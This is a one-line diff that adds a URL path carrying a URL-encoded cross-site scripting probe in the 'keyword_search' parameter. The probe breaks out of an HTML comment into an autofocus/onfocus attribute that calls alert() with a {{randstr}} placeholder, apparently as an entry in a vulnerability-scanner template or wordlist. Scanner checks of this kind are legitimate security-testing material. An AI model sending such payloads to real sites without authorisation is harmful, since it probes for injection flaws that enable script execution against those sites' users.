@@ -1,0 +1,1 @@
+/properties/?keyword_search=--!%3E%22%20autofocus%20onfocus%3Dalert(/{{randstr}}/)%3B%2F%2F
